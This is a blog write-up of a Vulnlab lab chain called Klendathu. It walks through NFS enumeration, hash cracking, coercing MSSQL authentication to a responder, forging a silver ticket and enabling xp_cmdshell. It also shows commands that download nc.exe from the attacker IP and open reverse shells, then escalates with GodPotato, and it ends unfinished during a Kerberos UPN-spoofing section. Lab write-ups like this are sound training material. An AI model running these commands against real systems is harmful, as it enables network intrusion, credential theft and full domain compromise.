---
layout: post
title: VL Klendathu (Chain Insane)
date: 2024-07-30
categories: [documentation]
tags: [Vulnlab, Chain, Active Directory, MSSQL, Silver Ticket, Relay Attack]
author: Ethicxz
---
# Before Starting 
```console
Me > 10.8.2.163
Target > 10.10.243.197 ; 10.10.243.198 ; 10.10.243.199
```
## Enumeration
```bash
nmap -sC -sV -A -T4 -p- -vvv ip


10.10.243.197 : # windows machine

Host is up (0.020s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

10.10.243.198 : # windows machine

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  mssql    (be patient, this one takes like 5 minutes to come up)
3389/tcp open  ms-wbt-server

10.10.243.199 : # linux machine

Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
2049/tcp open   nfs
```
We can see that the port 2049 is open on the linux machine :

[https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

## First User via nfs shares

```bash
rpcinfo -p 10.10.243.199

100003   4   tcp  2049  nfs
```
```bash
showmount -e 10.10.243.199
Export list for 10.10.243.199:
/mnt/nfs_shares *
```
Then we can mount like this :

```bash
mount -t nfs -o vers=4,nolock 10.10.243.199:/mnt/nfs_shares ./toto
```
We got 'Switch344_running-config.cfg', cat him and get the hash on the top of the file

```console
$1$[...]2Wb/
```
```bash
# crack it
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
On the bottom of the file we can see this : 'ZIM@KLENDATHU.VL'

So let's try creds for this user :

```bash
cme smb 10.10.243.198 -u 'zim' -p 'REDACTED'

SMB         10.10.243.198   445    SRV1             [*] Windows 10.0 Build 20348 x64 (name:SRV1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.243.198   445    SRV1             [+] KLENDATHU.VL\zim:REDACTED

cme ldap 10.10.243.197 -u 'zim' -p 'REDACTED'

SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
LDAP        10.10.243.197   389    DC1              [+] KLENDATHU.VL\zim:REDACTED

# then do a bloodhound
cme ldap 10.10.243.197 -u 'zim' -p 'REDACTED' --bloodhound -c all -ns 10.10.243.197

# list users
cme smb 10.10.243.197 -u 'zim' -p 'REDACTED' --users
SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.243.197   445    DC1              [+] KLENDATHU.VL\zim:REDACTED
SMB         10.10.243.197   445    DC1              [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.243.197   445    DC1              [+] Enumerated domain user(s)
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\krbtgt                         Key Distribution Center Service Account
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\RICO
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\JENKINS
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\IBANEZ
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\ZIM
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\DELADRIER
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\ALPHARD
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\LEIVY
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\FRANKEL
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\HENDRICK
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\PATERSON
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\AZUMA
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\CHERENKOV
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\CLEA
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\DUNN
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\FLORES
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\SHUJUMI
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\BARCALOW
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\BRECKENRIDGE
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\BYRD
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\MCINTHIRE
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\RASCZAK
SMB         10.10.243.197   445    DC1              KLENDATHU.VL\svc_backup 
```
We can also list shares but unsuccessful

![alt text](../assets/image_klendathu/1er.png)

As we see at the start on our nmap scan, there is a mssql on the .198, let's see if zim can authenticate :

```bash
cme mssql 10.10.243.198 -u 'zim' -p 'REDACTED'
MSSQL       10.10.243.198   1433   SRV1             [*] Windows 10.0 Build 20348 (name:SRV1) (domain:KLENDATHU.VL)
MSSQL       10.10.243.198   1433   SRV1             [+] KLENDATHU.VL\zim:REDACTED
```
Nice ! Let's connect :

## MSSQL Relay attack with restricted rights

```bash
mssqlclient.py klendathu.vl/'zim':'REDACTED'@'10.10.243.198' -windows-auth
```
At this time of the chain, I tried many things but nothing worked since I did not have the rights for what i tried, some things (not all) that i tried here :

```console
Enable xp_cmdshell
xp_dirtree "\\10.8.2.163\toto"
exec master.dbo.xp_dirtree "\\10.8.2.163\toto"
EXEC master..xp_subdirs "\\10.8.2.163\toto"
EXEC master..xp_fileexist "\\10.8.2.163\toto"
Impersonate SA or someone that have more rights
```
But i found this [https://www.brentozar.com/archive/2017/07/sql-server-2017-less-xp_cmdshell/](https://www.brentozar.com/archive/2017/07/sql-server-2017-less-xp_cmdshell/)

So i set a responder and i ran this :

```bash
SELECT * FROM sys.dm_os_enumerate_filesystem('\\10.8.2.163', 'toto')
```
![alt text](../assets/image_klendathu/2er.png)

Ok, now let's try to crack it :

```bash
hashcat -m 5600 -a 0 hash_2.txt /usr/share/wordlists/rockyou.txt
```
Now try creds : 

```bash
cme smb 10.10.243.197 -u 'Rasczak' -p 'REDACTED'

SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
SMB         10.10.243.197   445    DC1              [+] KLENDATHU.VL\Rasczak:REDACTED

cme ldap 10.10.243.197 -u 'Rasczak' -p 'REDACTED'

SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
LDAP        10.10.243.197   389    DC1              [+] KLENDATHU.VL\Rasczak:REDACTED
```
## Silver Ticket + Shell with SeImpersonatePrivilege

So, we are targetting a mssql database, if we can craft a silver ticket then we will able to impersonate SA, enable "xp_cmdshell" and get a shell with "SeImpersonatePrivilege" therefore, run a Potato and we are NT/AUTHORITY SYSTEM

[https://zethicxz.github.io/VL-Sendai-Machine/#other-way-to-privesc-silver-ticket--seimpersonateprivilege](https://zethicxz.github.io/VL-Sendai-Machine/#other-way-to-privesc-silver-ticket--seimpersonateprivilege)

[https://vulndev.io/2022/01/08/kerberos-silver-tickets/](https://vulndev.io/2022/01/08/kerberos-silver-tickets/)

Let's start the attack :

```bash
ticketer.py -nthash 'E2[...]72C' -domain-sid S-1-5-21-641890747-1618203462-755025521 -domain klendathu.vl -spn MSSQLSvc/srv1.klendathu.vl -user-id 500 Administrator

export KRB5CCNAME='Administrator.ccache'

mssqlclient.py srv1.klendathu.vl -windows-auth -k
```
```bash
# Enable xp_cmdshell
> EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Verify that we have SeImpersonatePrivilege
> xp_cmdshell "whoami /priv"

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

> xp_cmdshell "echo IWR http://10.8.2.163/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile"
> xp_cmdshell "%TEMP%\nc.exe 10.8.2.163 9001 -e powershell"
```
Then upload GodPotato and nc.exe in C:\temp

```powershell
./godpotato.exe -cmd "cmd /c C:\temp\nc.exe 10.8.2.163 1234 -e powershell
```
![alt text](../assets/image_klendathu/4er.png)

Bingo !!

## Abusing mixed vendor kerberos stacks

Ok now, i'll be 100% honest i was really lost, so i check the wiki of vulnlab for a guidance, and the wiki say that : 

```console
Look into mixed vendor kerberos stacks - your goal is logging into the linux server
```
So i google : 'mixed vendor kerberos stacks' and i found this :

[https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)

[https://www.youtube.com/watch?v=ALPsY7X42o4](https://www.youtube.com/watch?v=ALPsY7X42o4)

I'll let you look at the links i put because they explain extremely well but in summary, if you have rights such as "Generic Write" on a domain user, you can edit the attribute "userPrincipalName". Therefore, we can set this to the value of the samAccountName attribute of another AD account.

The attribute "userPrincipalName" is utilized by NT_ENTERPRISE and NT_ENTERPRISE is a name-type

And thanks to NT_ENTERPRISE we can spoof domain users

[The algorithm to find which user will be used for authentication purposes when searching for principals within the realm](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6435d3fb-8cf6-4df5-a156-1277690ed59c)

Simplified version of the algorithm :

![Simplified version of the algorithm](../assets/image_klendathu/5er.png)

So let's verify if we have "Generic Write" on a domain user :

![Verify Bloodhound](../assets/image_klendathu/3er.png)

Yes we have !! We can also modify their password, let's check which user are in the group "Linux_Admins"

![Linux_Admins](../assets/image_klendathu/6er.png)

Ok so, we need to edit the attribute "userPrincipalName" of flores or leivy (no matter) and make the "name-type" be NT_ENTERPRISE instead of NT_PRINCIPAL, we can do this with Rubeus.exe or if we modify getTGT.py of the impacket collections

After that we gonna have a .ccache with which we can ssh as "Linux_Admins"

In Process....



